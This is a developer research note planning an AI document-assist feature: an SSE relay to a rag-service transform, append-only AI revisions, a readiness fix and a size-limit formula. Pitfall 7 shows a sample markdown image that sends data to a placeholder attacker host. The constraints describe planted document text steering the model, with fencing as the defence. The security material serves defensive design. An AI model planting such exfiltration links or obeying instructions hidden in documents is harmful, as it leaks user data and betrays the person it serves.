# Phase 14: AI Document Assist - Research

**Researched:** 2026-10-16
**Domain:** Spring Boot SSE relay to rag-service `/v1/transform`, append-only snapshot revisions, React side-by-side viewer
**Confidence:** HIGH for the repository facts (read from code this session); MEDIUM for the Phase 13 seams (plans 13-01..06 exist, the browser controller plan 13-08 does not yet)

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions
- The transform endpoint is Phase 10's `POST /v1/transform`. The caller owns the instruction text, and rag-service fences the document as data (D-10-09). D-10-10 returns 413 beyond `num_ctx`, and D-10-12 gives the same 120 s deadline and the same events as chat.
- Snapshots are append-only (D-05-06). `markdown` holds resolved Markdown, never HTML (D-05-05).
- The instructions live in config (D-13-19, user request). The browser goes through the cookie login and never holds the rag-service key (Phase 13 pattern).
- Residual risk: on the dev model, planted text in a document can steer the transform (golden T03, accepted for dev in 7f54818). The production model must pass T03 before v1.1 ships.
- **D-14-01:** A saved AI-assisted result is revision N+1 and **is current like any other revision**. The viewer, PDF/DOCX exports and the assistant index (latest revision only, D-12-11) all use it.
  - DOC-09 readiness and staleness stay tied to the ticket set: an AI revision of a stale document is still stale.
  - The revision carries an `aiAssisted` flag and the instruction used. This needs a migration.
- **D-14-02:** Regenerating from the template after an AI revision **appends a new revision on top** as usual, and the AI edits are not carried over. History shows both. The regenerate action shows a notice: "the latest revision was AI-assisted; regenerating replaces it as current".
- **D-14-03:** A **Summarize result is view, copy or download only, never saved** as a revision. Only Clean up and custom-instruction results can be saved.
- **D-14-04:** The layout is **side by side** in the document viewer: the original on the left and the result streaming in on the right. On narrow screens they stack.
- **D-14-05:** The result is edited as **raw Markdown in a textarea with a Preview toggle**, rendered by the existing markdown-it viewer. There is no new editor dependency.
- **D-14-06:** AI-assisted revisions are marked by an **"AI-assisted" badge plus the instruction in revision history**, and a **banner in the viewer**. **PDF/DOCX exports are not stamped**, because they go to approvers as the document.
- **D-14-07:** **Prompts are per mode and per document type:** Clean up and Summarize, each for release notes, runbook and approval. They are config keys under `app.assistant.*` (or a sibling block) in both `application.yml` files, overridable by env, following D-13-17/19.
- **D-14-08:** **Only the document text is sent to the model.** No ticket summaries, commit messages or Jira fields.
- **D-14-09:** A custom instruction is **free text**. The instruction is saved with the revision (ASST-10). The last 5 used are offered in a dropdown, held **in memory only** until reload, consistent with D-13-12.
- **D-14-10:** A document that is too long gets **a clear message, and there is no chunking.** An estimate disables the buttons before sending, and a 413 from rag-service shows the same message ("too long for the AI model on this server, about N of M characters"). A bigger production model raises the limit through config.
- **D-14-11:** **Fact check: a ticket-key and version-string diff that warns.** Before Save, any ticket keys or version strings that are missing from or new in the result are listed above the Save button. The user can still save after seeing the warning.
- **D-14-12:** Runbook and approval results get a **"verify steps before use" banner** above the result and on the saved AI revision in the viewer. It does not appear in exports.
- Discard stores nothing. When the service is offline, the user sees a clear message and document generation is unaffected (SC3), using Phase 13's outcome states.

### Claude's Discretion
- Exact prompt wording per mode and type, and key names.
- Revision schema: flag and instruction columns, and the migration number.
- How the stream reaches the browser: reuse Phase 13's streaming endpoint pattern.
- How "about N characters" is estimated client-side vs server-side.
- The fixed document set for SC4 (a small fixture of real-shaped documents checked by the ticket-key diff).

### Deferred Ideas (OUT OF SCOPE)
- Feeding ticket summaries, commit messages or a Jira "implementation notes" field into the prompts (D-14-08).
- Chunked transforms for long documents (D-14-10).
- Export stamping of AI-assisted revisions (D-14-06).
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| ASST-09 | Send any generated document to the model to clean up, summarize or apply a custom instruction; the result streams in beside the original | Findings 4 (transform client), 5 (limits), 6 (config and prompts), 7 (frontend), 10 (Phase 13 seams); AI-SPEC sections 3 and 4 |
| ASST-10 | Edit the AI result and save as a new revision marked AI-assisted, instruction recorded, original never changed | Findings 1 (revision persistence), 2 (readiness correction), 3 (export), 8 (FactDiff); AI-SPEC D8 |
| DOC-07 (carried) | Snapshots immutable and append-only | Finding 1: no update path added; migration adds columns only |
| DOC-09 (carried) | Staleness tied to the ticket set | Finding 2: **a code change IS needed** (contradicts CONTEXT "unchanged") |
</phase_requirements>

## Project Constraints (from CLAUDE.md)

- Java 25, Spring Boot 4.1, hexagonal ports/adapters enforced by `ArchitectureBoundaryTest` (application must not depend on `adapters.*`; `RestClient` only in `adapters`/`config`).
- Minimal code, no over-engineering, no speculative abstraction, no compat shims, no dead or commented-out code; comments only for a non-obvious WHY.
- Enterprise-grade: validate at system boundaries only; no caching or batching without a measured need; never log content (SAFE-03).
- Git: stage files by name; no `Co-Authored-By` trailers (the user's global CLAUDE.md overrides the harness attribution reminder); messages explain why. Researcher does not commit.
- Work only through GSD workflow commands; no extra planning or analysis markdown beyond GSD artifacts.
- Environment landmines (memory): `JAVA_HOME=C:/Users/ucs/.jdks/jdk-25` on every Maven call, `-P '!frontend'` for backend-only runs, `clean` after record changes, `src/test/resources/application.yml` shadows the main one (every new key in both files), never run the Vite dev server, jq is absent, do not touch Docker or Ollama.

## Summary

Phase 14 is mostly wiring over existing seams: one new Flyway migration (V12) plus a nullable `AiAssist` component on `DocumentSnapshot`; a sibling save path next to `DocumentGenerationService.generate`; a `RagTransformPort`/`RagTransformAdapter` that shares the SSE line loop with `RagChatAdapter` (after Phase 13 plan 13-05 amends that loop); a browser SSE endpoint that mirrors Phase 13's `/api/assistant/chat`; and a viewer panel in `DocumentViewerRoute` with no new dependency. No new library is needed on either side. All persistence reuse is clean: `DocumentSnapshotRepositoryAdapter.create` already copies the logo, publishes `ReleaseIndexInvalidated` and is covered by the after-commit index test, so D-14-01's "the index picks up the new latest revision" holds with no index code change.

Four findings change the plan relative to CONTEXT/AI-SPEC and must be honoured by the planner. (1) **`DocumentReadinessService` does need a change**: `all()` compares the latest snapshot's `generatedAt` to the release's change timestamps. An AI revision saved "now" would flip a stale document to UP_TO_DATE, violating D-14-01. The fix is a nullable `basis_generated_at` carried from the source revision and a one-line change in `all()`. No existing test pins the intended behaviour, so one must be added. (2) The AI-SPEC size formula differs by up to one token (3 characters) from rag-service because rag uses integer division; the mirror must use `floor((numCtx - systemTokens - ceil(L/cpt) - 256) / 2)` then `* cpt`, and the limits are not readable from rag-service, so they must be configured. (3) The 413 problem body has no structured `maxChars` field, only prose in `detail`; the app already knows M from its own estimator and should not depend on parsing it. (4) PDF export renders body images through flexmark and openhtmltopdf; whether it fetches absolute remote image URLs is unverified, and AI output is a new way to plant one. A Wave 0 probe test decides whether the save path (or the PDF adapter) must neutralise remote images.

Sequencing: Phase 14 backend config must follow 13-01 (same `AssistantProperties` record and both ymls), the transform adapter must follow 13-05 (same `readStream` loop), and the browser controller must follow Phase 13's controller plan (13-08 per the 13-02 interface text; not yet written). The frontend stream client must follow 13-02 (`apiFetchRaw`, `parseSse`).

**Primary recommendation:** Build the persistence and readiness change first (V12, `AiAssist`, `basis_generated_at`, `AiRevisionService`), then the transform adapter on a shared SSE reader, then the controller and limits endpoint, then the viewer panel; keep the live golden harness a late, checkpointed plan sized to what the 4 GB dev GPU can complete.

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Choose mode, run, stop, edit, preview, discard | Browser / Client | - | Edit buffer and stream state are memory-only (D-13-12, D-14-09) |
| Transform input resolution (stored revision, never client text) | API / Backend | Database | Original must be unalterable and un-spoofable (AI-SPEC D8) |
| Instruction selection (config or custom) | API / Backend | - | Config text is server-owned; CLEAN_UP save records the server's text, not the client's |
| Size gate (authoritative) | API / Backend | Browser (estimate to disable buttons) | rag 413 is the final authority; server pre-checks with the mirrored formula |
| Stream relay with abort propagation | API / Backend (virtual thread + `SseEmitter`) | `adapters.rag` (closes upstream) | Same three-link abort chain as Phase 13 |
| Fencing, model call, deadline, single in-flight slot | rag-service | - | Domain-free AI boundary (D-10-09) |
| AI revision write, copy of template fields and logo | API / Backend | Database | `AiRevisionService` + existing `DocumentSnapshotRepository.create` |
| Staleness basis | API / Backend (`DocumentReadinessService`) | Database (column) | Single staleness comparison (T-05-55) |
| Fact-check diff | Browser (warning, live) | API (log counts only, optional) | D-14-11 is a UI warning; server copy exists only for AI-SPEC section 7 counts |
| Banners, badge, regenerate notice | Browser | API (fields on document responses) | Never part of `RenderedDocument` chrome or exports (D-14-06) |
| Export of latest revision | API / Backend (`DocumentExportService`) | - | Unchanged; reads stored markdown and chrome |
| Re-index after save | API / Backend (after-commit listener) | rag-service | Existing 12-08 mechanism |

## Standard Stack

No new dependency on either side [VERIFIED: `pom.xml`, `frontend/package.json`, `rag-service/pom.xml`].

### Core
| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| Spring MVC `SseEmitter` | Boot 4.1.0 / Framework 7 | Browser-facing stream | Phase 13 house pattern; rag-service `ChatController` uses it [VERIFIED: ChatController.java] |
| Spring `RestClient` (`ragChatRestClient` bean) | Boot-managed | Upstream `POST /v1/transform` | Reuse the existing generation client: connect PT2S, read PT130S, above rag's 120 s deadline [VERIFIED: application.yml, RagRestClientConfig.java] |
| Jackson 3 (`tools.jackson.databind`) | Boot-managed | Wire JSON | `RagChatAdapter` precedent [VERIFIED] |
| Flyway + Spring Data JPA | Boot-managed | V12 migration, entity columns | Existing; V1..V11 present [VERIFIED: migration dir] |
| markdown-it | 15.0.0 | Preview and viewer rendering | Already the `md` instance with `html:false` [VERIFIED: RenderedDocument.tsx, package.json] |
| React 19.2.8 / TanStack Query + Router | pinned | Panel, queries, mutation | Existing [VERIFIED: package.json] |
| WireMock 3.13.2 / Testcontainers 2.0.5 / ArchUnit 1.4.2 | pinned | Tests | Existing [VERIFIED: pom.xml] |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| A second `transform.read-timeout` client bean (AI-SPEC section 3) | Reuse `ragChatRestClient` | One bean is enough: the JDK read timeout bounds time to response headers only (12-10 summary limitation) and rag sends `status` immediately. Raising the deadline later means changing `chat.read-timeout` too |
| New `app.assistant.transform.stream-deadline` key | Reuse Phase 13's `stream-deadline` (PT5M) | The listener deadline already exists in 13-01; a second key adds nothing |
| `eventsource-parser` / fetch-event-source | Phase 13's hand-rolled `parseSse` | 13-02 already chose hand-rolled; do not add a dependency |

**Installation:** none. **Version verification:** nothing to look up; every version above is read from the repo manifests.

## Architecture Patterns

### System Architecture Diagram

```
Browser (DocumentViewerRoute, latest revision only)
  GET /api/assistant/transform/limits  ---->  AssistantTransformController (conditional on app.assistant.enabled)
                                                  returns estimator constants + per-mode/type preset limits (config only, no rag call)
  POST /api/assistant/transform {releaseId, documentType, sourceRevision, mode, instruction?}
        |  cookie JWT (existing chain; SameSite=Strict is the CSRF control)
        v
  validate (400) -> resolve stored latest revision (404; 409 REVISION_SUPERSEDED if sourceRevision != latest)
        -> instruction = mode==CUSTOM ? request text : config[mode][type]
        -> TransformSizeEstimator.assertFits (413 problem+json with characters + maxCharacters, BEFORE any stream)
        -> new SseEmitter(streamDeadline + 30 s) in ResponseEntity, virtual thread:
              RagTransformPort.transform(markdown, instruction, listener)
                 RagTransformAdapter --POST /v1/transform--> rag-service (fence, num_predict, 120 s deadline, 1 in flight)
                 shared SSE reader: ':' -> heartbeat, token, done, error
              listener -> browser events:  token{text} | done{finishReason, truncated, complete} | error{outcome, retryAfterSeconds?, maxChars?} | ": hb"
  abort() -> next write fails -> ClientGoneException -> adapter exchange closes upstream -> rag frees the slot

  POST /api/assistant/documents/ai-revisions {releaseId, documentType, sourceRevision, mode, instruction?, markdown}
        -> mode in {CLEAN_UP, CUSTOM} else 400; sourceRevision == latest else 409
        -> AiRevisionService.save: copy template fields + chrome + logo from the source row, AiAssist(mode, instruction, sourceRevision, basis)
        -> DocumentSnapshotRepository.create  (@Transactional; publishes ReleaseIndexInvalidated)
              -> AFTER_COMMIT IndexInvalidationListener -> IndexSyncer -> latest revision per type -> rag index
  GET document / revisions / readiness: same endpoints, new fields aiAssisted, aiMode, aiInstruction; readiness uses basis
```

### Recommended Project Structure
```
src/main/resources/db/migration/V12__document_snapshot_ai_assist.sql
src/main/java/com/evision/releasemgmt/
├── domain/document/DocumentSnapshot.java            # + AiAssist component, stalenessBasis(), createAiRevision(...)
├── domain/document/AiAssist.java, AiMode.java       # CLEAN_UP, CUSTOM (persisted); SUMMARIZE lives only in TransformMode
├── domain/assistant/TransformMode.java, TransformOutcome.java   # Done | TooLarge(maxChars) | Failed(FailureReason, retryAfterSeconds)
├── ports/RagTransformPort.java
├── adapters/rag/RagTransformAdapter.java            # + SseStreamReader extracted from RagChatAdapter
├── adapters/persistence/...                         # entity columns + toEntity/toDomain
├── adapters/web/AssistantTransformController.java   # limits, transform (SSE), ai-revisions (save)
├── application/assistant/AssistantTransformService.java, TransformSizeEstimator.java, FactDiff.java (optional, see Finding 8)
├── application/AiRevisionService.java               # sibling of DocumentGenerationService
└── config/AssistantProperties.java                  # + documentAssist block (after 13-01)
frontend/src/api/documentAssist.ts                   # limits query, streamTransform, saveAiRevision mutation, recent-instructions store
frontend/src/components/AiAssistPanel.tsx            # bar, custom box, too-long, result card
frontend/src/lib/factDiff.ts                         # or beside the panel
```

### Pattern 1: Append-only AI revision as a sibling of generate
**What:** `AiRevisionService.save` reads the source row, builds `DocumentSnapshot.createAiRevision(source, nextRevision, markdown, mode, instruction, actor, now)`, and calls `snapshotRepository.create(snapshot, logo)` where `logo = snapshotRepository.findLogo(source.id())`. No outer `@Transactional` (the repository method is the transaction and the after-commit listener fires when it commits; an outer read-then-write transaction would only widen the unique-constraint race window).
**When to use:** the only write path for AI text.
**Example:**
```java
// Source: derived from DocumentGenerationService.generate and DocumentSnapshotRepositoryAdapter.create (read this session)
public DocumentSnapshot save(UUID releaseId, TemplateDocumentType type, int sourceRevision, AiMode mode,
                             String customInstruction, String markdown, String actor) {
    DocumentSnapshot source = snapshotRepository.findLatest(releaseId, type).orElseThrow(DocumentNotFoundException::new);
    if (source.revision() != sourceRevision) throw new RevisionSupersededException();   // 409
    String instruction = mode == AiMode.CLEAN_UP ? properties.instruction(TransformMode.CLEAN_UP, type) : customInstruction;
    int revision = snapshotRepository.nextRevision(releaseId, type);
    LogoImage logo = snapshotRepository.findLogo(source.id()).orElse(null);
    return snapshotRepository.create(
            DocumentSnapshot.createAiRevision(source, revision, markdown, mode, instruction, actor, Instant.now()), logo);
}
```

### Pattern 2: Browser stream relay mirrors Phase 13
Return `ResponseEntity<SseEmitter>` with `Cache-Control: no-cache` and `X-Accel-Buffering: no`, run on `Thread.ofVirtual()`, treat `IOException`/`IllegalStateException` on write as client gone (throw `ClientGoneException`, introduced by 13-03), forward `: hb` for every upstream comment line. Do not set `produces = TEXT_EVENT_STREAM` on the mapping, so 400/404/409/413 stay `application/problem+json` (AI-SPEC section 3 is right about this).

### Anti-Patterns to Avoid
- **Reading `generatedAt` as the staleness basis for an AI revision** (Finding 2).
- **Trusting the client's `instruction` for CLEAN_UP**: the banner shows "Instruction used"; the server records its own configured text so the audit record is true.
- **A second copy of the SSE loop** with its own abort semantics: the `ListenerFailure` wrapper in 13-05 is subtle; extract one reader.
- **Putting document-assist instructions under `app.assistant.prompts.<mode>.<type>`** (AI-SPEC): 13-01 already types `prompts` as `{scopedQuestion, toolDescriptions}`; use a sibling block.
- **Logging or tagging anything with document, instruction or result text** (SAFE-03), including exception messages that echo request bodies.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| SSE framing to the browser | Raw `OutputStream` | `SseEmitter` | Framing, flush, async lifecycle (Phase 13) |
| SSE parsing in the browser | New parser | Phase 13 `parseSse` from `api/assistant.ts` (13-02) | Already tested for split chunks, CRLF, multibyte |
| Upstream SSE parsing in Java | Second copy of `readStream` | Extract a small `SseStreamReader` used by both adapters | One place for comment/heartbeat/abort semantics |
| Markdown rendering for Preview | New editor or sanitizer | Existing `md` (`html:false`) plus an `image` rule override | No new dependency (D-14-05) |
| Revision numbering and uniqueness | New counter | `nextRevision` + UNIQUE `(release_id, document_type, revision)` | Existing |
| Logo copy | New copy code | `findLogo(source.id())` passed to `create` | Existing D-05-05 mechanism |
| Index refresh | New trigger | `create` already publishes `ReleaseIndexInvalidated` | Pinned by `IndexAfterCommitIT` |
| Download | Server endpoint | `Blob` + existing `triggerDownload` | UI-SPEC: no server call |

**Key insight:** every hard part (immutability, logo copy, index refresh, abort chain, SSE parsing) already exists. The risk is in the seams: staleness basis, the size formula parity, the shared SSE loop being edited by Phase 13, and the config block colliding with 13-01.

## Common Pitfalls

### Pitfall 1: AI revision flips a stale document to up to date
**What goes wrong:** `DocumentReadinessService.all()` maps each latest snapshot to `snapshot.generatedAt()` and `state()` returns STALE only when that instant is before `lastRefreshedAt` or `itemsChangedAt`. An AI revision saved now is after both.
**Why it happens:** CONTEXT assumed readiness is unchanged; it reads the latest snapshot's timestamp, not the ticket-set basis.
**How to avoid:** `basis_generated_at` (copied from the source's own basis) and `all()` uses `snapshot.stalenessBasis()`. `state()` stays pure and unchanged.
**Warning signs:** a release with a stale pill shows "Up to date" right after an AI save.

### Pitfall 2: Size formula off by one token
**What goes wrong:** the AI-SPEC mirror uses real division and gives 5,524 where rag allows 5,523 (instruction 14 chars); a document exactly at the mirror limit gets a rag 413 after the pre-flight passed.
**How to avoid:** integer division exactly as rag (`(numCtx - est(sys) - est(instr) - 256) / 2`), then `tokens * cpt`. Boundary vectors below.

### Pitfall 3: `TRANSFORM_SYSTEM` says "Output plain text"
**What goes wrong:** Clean up flattens headings, lists and tables.
**How to avoid:** every shipped instruction says "Output Markdown, not plain text" and what to keep. Also keep `[[unknown: ...]]` markers, because the viewer renders them as warning chips.

### Pitfall 4: The 413 body is prose
**What goes wrong:** a client that expects `maxChars` as a field finds none. The body is `{title:"Text too large", status:413, detail:"Text exceeds the maximum of N characters for this model's context window", reason:"TEXT_TOO_LARGE"}` [VERIFIED: GlobalExceptionHandler, TextTooLargeException].
**How to avoid:** the main app computes M itself and uses it in its own error event. If the rag 413 is hit anyway (estimator drift), map it to `TransformOutcome.TooLarge` and read N with a regex on `maximum of (\d+) characters`, falling back to the local estimate. Optional one-line rag change: add a `maxChars` property to the problem. Not required.

### Pitfall 5: Save accepts a stale source
**What goes wrong:** the user edits an AI result based on revision 3 while a regenerate created revision 4; saving appends revision 5 holding text derived from 3.
**How to avoid:** `sourceRevision` must equal the current latest, else 409 `REVISION_SUPERSEDED`; the same check on the transform request.

### Pitfall 6: Canonical-constructor churn
**What goes wrong:** adding a record component to `DocumentSnapshot` breaks every `new DocumentSnapshot(...)` call. Five test files call the canonical constructor: `DocumentControllerTest`, `DocumentExportControllerTest`, `IndexDocumentMapperTest`, `DocumentsToolTest`, `DocumentExportServiceTest` (plus `DocumentSnapshot.create` callers, which are unaffected). Frontend fixtures typed as `GeneratedDocument` / `DocumentRevision` break `tsc -b` because `tests` is in tsconfig `include`.
**How to avoid:** one nullable component `AiAssist aiAssist`, update the call sites (mechanical, no compat constructor per project rule), and `clean` Maven after record changes.

### Pitfall 7: Remote image in model output
**What goes wrong:** `![x](https://attacker/?q=...)` loads in the browser Preview/viewer, and possibly the PDF export fetches it server-side.
**How to avoid:** Preview and AI-revision viewer render `[image: alt]` (Finding 7); Wave 0 probe on `PdfExportAdapter` (Security Domain).

### Pitfall 8: Config drift between the two ymls and rag-service
**What goes wrong:** the test yml shadows main; `num-ctx`, `chars-per-token`, `system-tokens`, `instruction-max-chars` are mirrors of rag keys that cannot be read at runtime. 13-D-13-18 makes `TRANSFORM_SYSTEM` overridable in rag, which silently changes `system-tokens`.
**How to avoid:** follow 13-01's pattern (an `AssistantPropertiesTest` that binds both yml files and asserts identical defaults), comment each mirror with the rag key it must equal, and keep the boundary vectors in both modules' tests.

## Findings: answers to the ten planning questions

### 1. Revision persistence [all VERIFIED from code]

- **Types.** `DocumentSnapshot` is a record `(id, releaseId, documentType, revision, markdown, templateId, templateName, templateBody, chrome, generatedAt, generatedBy)` with a static `create(...)`. `DocumentSnapshotEntity` has setters for each column including `logo_render_height_mm` (V6). `DocumentSnapshotRepositoryAdapter.create(snapshot, logo)` is `@Transactional`, `saveAndFlush`es (translating a unique violation to `IllegalStateException`), saves the logo copy, publishes `ReleaseIndexInvalidated`, then reloads. The port `DocumentSnapshotRepository` documents "no update, no delete": do not add one.
- **How generation appends.** `DocumentGenerationService.generate` resolves the template, renders body and chrome with `RenderService.resolveText`, calls `nextRevision`, loads the template logo, `DocumentSnapshot.create(...)`, `snapshotRepository.create(snapshot, logo)`. No lifecycle guard (frozen releases can generate); the AI save should not add one either.
- **Latest Flyway version is V11** (`V10__environment_ladder_promotion.sql`, `V11__story_points.sql`); the research that saw V9 was stale. Use `V12__document_snapshot_ai_assist.sql`. At execution time `ls src/main/resources/db/migration` again before numbering.
- **Recommended V12** (no backfill, no defaults, existing rows stay NULL = not AI, same reasoning as the V5 comments):
```sql
ALTER TABLE document_snapshot
    ADD COLUMN ai_mode            VARCHAR(16) CHECK (ai_mode IN ('CLEAN_UP', 'CUSTOM')),
    ADD COLUMN ai_instruction     TEXT,
    ADD COLUMN ai_source_revision INTEGER     CHECK (ai_source_revision >= 1),
    ADD COLUMN basis_generated_at TIMESTAMPTZ;

ALTER TABLE document_snapshot ADD CONSTRAINT document_snapshot_ai_all_or_none CHECK (
    (ai_mode IS NULL AND ai_instruction IS NULL AND ai_source_revision IS NULL AND basis_generated_at IS NULL)
    OR (ai_mode IS NOT NULL AND ai_instruction IS NOT NULL AND ai_source_revision IS NOT NULL
        AND basis_generated_at IS NOT NULL));
```
  A separate `ai_assisted` boolean is redundant (`ai_mode IS NOT NULL`); expose `aiAssisted` as a derived field. If the user prefers the explicit boolean named in D-14-01/AI-SPEC, add it and tighten the CHECK; this is Claude's discretion (schema). "Saved-by" needs no column: the AI save writes the acting `Principal.getName()` into the existing `generated_by`, and `ActorResolutionService` already renders it (the UI-SPEC says "reuse generatedBy"). `generated_at` is the save time, shown as "saved".
- **Copying template fields (D-05-05).** `DocumentSnapshot.createAiRevision(source, revision, markdown, mode, instruction, actor, now)` copies `templateId`, `templateName`, `templateBody` and the already-resolved `chrome` from the source row (the source is itself a snapshot, so chrome is already resolved), and the logo is copied by passing `findLogo(source.id())` to `create`. Nothing re-resolves Mustache.
- **After-commit index (12-08, D-14-01).** `create` publishes `ReleaseIndexInvalidated`; `IndexInvalidationListener` is `@TransactionalEventListener(AFTER_COMMIT)` and enqueue-only; `IndexSyncer` loads `snapshots.findLatest(release, type)` per type and `IndexDocumentMapper.latestPerType` keeps the max revision, with the stable document id `document:{release}:{TYPE}`. So the AI revision replaces the previous one in the index with no change. `IndexAfterCommitIT` already asserts `snapshots.create` publishes exactly one invalidation; add an AI-revision case there and an `IndexDocumentMapperTest` case (AI revision N+1 is the indexed text and `revision` metadata). Optional: add an `ai_assisted` metadata key so the assistant can tell; not required by any decision (open question).
- **DTOs.** `DocumentResponse` and `DocumentRevisionResponse` gain `aiAssisted`, `aiMode`, `aiInstruction`. `DocumentController.revisions` builds each row in a stream; `toResponse` builds the single document. Frontend types `GeneratedDocument` and `DocumentRevision` gain the same fields (required, fixtures updated).

### 2. Readiness and staleness [VERIFIED]

**CONTEXT is wrong that `DocumentReadinessService` is unchanged.** `all()` builds `latestGeneratedAt` from `snapshot.generatedAt()` of `findLatestForAllReleases()`. Fix:
```java
// DocumentSnapshot
public Instant stalenessBasis() { return aiAssist == null ? generatedAt : aiAssist.basisGeneratedAt(); }
// DocumentReadinessService.all()
latestGeneratedAt.put(new SnapshotKey(snapshot.releaseId(), snapshot.documentType()), snapshot.stalenessBasis());
```
`createAiRevision` sets `basisGeneratedAt = source.stalenessBasis()`, so a chain of AI revisions keeps the original generation basis. `state()` (pure) is unchanged. Only `all()` consumes the snapshot timestamp for staleness (grep of `generatedAt`/`generated_at` found no other use for staleness; the JPA query `findLatestPerReleaseAndType` returns entities and needs no change). Frozen releases remain UP_TO_DATE regardless.
**Tests that pin it:** none today. `DocumentReadinessServiceTest` covers only `state()` and two `all()` cases with an empty snapshot list; `DocumentReadinessControllerTest` does not build AI snapshots. Add: (a) `all()` with an AI revision whose basis is before `lastRefreshedAt` returns STALE even though `generatedAt` is after it; (b) an AI revision of an up-to-date doc stays UP_TO_DATE, then becomes STALE after `itemsChangedAt` moves; (c) a persistence IT that `createAiRevision` of a chain keeps the first basis.

### 3. Export [VERIFIED]

`DocumentExportService.resolve` uses `findLatest` (or `findByRevision`); `toPdf/toDocx(snapshot)` pass `snapshot.markdown()`, `snapshot.chrome()` and the logo row to the adapters. No stamp exists or is added (D-14-06). `DocumentController` resolves the snapshot once and reuses it for filename and bytes (WR-02). Latest-revision behaviour is pinned by `DocumentExportServiceTest` (revision 5 "# Latest") and `DocumentExportControllerTest`. New test: an AI revision exports its own markdown and chrome with no AI wording, and the viewer banners are absent from the exported bytes (they are not in `RenderedDocument` or in snapshot data). **Security caveat** (Security Domain): the PDF path renders body images.

### 4. Transform client [VERIFIED]

- **Shared loop.** `RagChatAdapter.readStream`/`handle` is private and tied to chat events, but its line loop (`event:` / `data:` / blank-line dispatch / `break` on done or error) is the part to share. 13-05 edits it (heartbeat for `:` lines, `ListenerFailure` wrapper so listener exceptions propagate and close the upstream, Retry-After). Recommendation: a first Phase 14 task, after 13-05 lands, extracts a package-private `SseStreamReader` in `adapters.rag` (read lines, call `onComment()` for `:` lines, call `onEvent(name, data)` and stop when it returns true), refactors `RagChatAdapter` onto it under the existing `RagChatAdapterTest`, then `RagTransformAdapter` uses it. Mirror error mapping: 429 -> BUSY with `Retry-After`, 503 with reason `MODEL_NOT_AVAILABLE` -> MODEL_MISSING else OFFLINE, 413 -> `TooLarge`, 400 -> REJECTED, connect failure -> OFFLINE, read timeout -> DEADLINE.
- **Events (transform).** `status{requestId, phase:"GENERATING"}`, `token{text}`, `done{refusal, refusalLayer, finishReason, truncated, promptTokens, completionTokens}` (`StreamEvents.Done`), `error{reason}` with reasons DEADLINE | GENERATION_FAILED | OLLAMA_UNAVAILABLE | MODEL_NOT_AVAILABLE | INTERNAL, and `:` comment heartbeats every 15 s (`heartbeat-interval: PT15S`). No `citations`. After a DEADLINE cancel rag sends `error{DEADLINE}` and **no** `done`; after CLIENT_GONE it sends nothing. `finishReason` is Ollama's done reason (`stop` or `length`); `truncated` is rag's prompt-overflow heuristic (`probablyTruncated`).
- **Complete means** `done` with `finishReason == "stop"` and `truncated == false` (AI-SPEC section 6). A stream that ends with neither `done` nor `error` is FAILED. Compute `complete` server-side in the browser `done` event so the client has one boolean.
- **Timeouts.** `ragChatRestClient`: connect PT2S, read PT130S, above rag's 120 s deadline [VERIFIED]. The JDK read timeout bounds time to headers, not between chunks (12-10 summary; unconfirmed in a live run), so mid-stream stalls rely on rag heartbeats, rag's own deadline, and Phase 13's listener `stream-deadline` (PT5M) checked on every token and heartbeat. Browser `SseEmitter` timeout = deadline + 30 s backstop.
- **Request shape.** `TransformRequest{text @NotBlank, instruction @NotBlank}`, instruction at most 2000 characters (`rag.chat.instruction-max-chars`) else 400 `INVALID_CONTENT`; text and instruction must not contain NUL; request body at most 2 MB (`rag.limits.max-request-bytes`). rag neutralises `<<<`, `>>>`, nonce and chat-template tokens in both fields before fencing, so shipped instruction text must not rely on those sequences.
- **One in-flight slot per client** is shared with chat and indexing pauses meanwhile (docs/docker.md).

### 5. Size limits endpoint [VERIFIED formula; limits not readable]

rag `TransformService.prepare`: `maxTokens = promptBuilder.maxTransformTextTokens(instruction) = (numCtx - est(TRANSFORM_SYSTEM) - est(instruction) - 256) / 2` (integer division), reject when `est(text) > maxTokens`, with `est(s) = ceil(len/3.0)` and the reported `maxChars = floor(maxTokens * 3.0)`. `TRANSFORM_SYSTEM` is 456 characters, so 152 tokens at 3.0 chars per token. `TEMPLATE_SLACK` = 256 is a package-private constant in rag. **None of numCtx, chars-per-token, instruction-max-chars or the system prompt length is exposed by any rag endpoint** (`/v1/status` returns only `{ollama, pending, failed}`), so they must be configured in the main app and kept equal to `rag.chat.num-ctx` (4096), `chars-per-token` (3.0), `instruction-max-chars` (2000) and the p10-v2 `TRANSFORM_SYSTEM`. 13-D-13-18 makes the system text overridable in rag, so `system-tokens` must be re-derived whenever that is overridden.

**Mirror (use this, not the AI-SPEC formula):**
```java
int tokens = (numCtx - systemTokens - ceilDiv(instructionChars, charsPerToken) - TEMPLATE_SLACK) / 2; // integer division
int maxChars = (int) Math.floor(tokens * charsPerToken);
boolean fits = ceil(documentChars / charsPerToken) <= tokens;   // equivalent to documentChars <= maxChars
```
**Boundary vectors** (numCtx 4096, system 152, slack 256, cpt 3.0) [VERIFIED by computation this session against the rag source]: instruction 14 chars -> 5,523 (AI-SPEC formula gives 5,524); 300 -> 5,382; 301 -> 5,379 (AI-SPEC 5,380); 330 -> 5,367; 500 -> 5,280 (5,281); 2000 -> 4,530 (4,531). A document of exactly `maxChars` fits and `maxChars + 1` is rejected. Put the same vectors in a main-app `TransformSizeEstimatorTest` and, optionally, a rag `TransformServiceTest` boundary case, so a change to either side fails a test. Lengths are UTF-16 code units in both Java `String.length()` and JS `string.length`.

**How the limit reaches the UI.** `GET /api/assistant/transform/limits` (conditional on the switch, config only, no rag call, no document): `{estimator:{numCtx, charsPerToken, systemTokens, templateSlack, instructionMaxChars}, presets:{CLEAN_UP:{RELEASE_NOTES:{instructionChars,maxChars},...}, SUMMARIZE:{...}}}`. The client knows the document length (`markdown.length` is already in the document response), disables Clean up and Summarize from `presets`, and for Custom applies a six-line TS copy of the formula with the typed length (UI-SPEC: Run disabled with the recomputed M). The server re-checks authoritatively and answers 413 problem+json `{reason:"TEXT_TOO_LARGE", characters, maxCharacters}` before any stream; a rag 413 or a failed limits lookup falls back to that same message. Keep this endpoint separate from Phase 13's `/status` (a Phase 13 file).

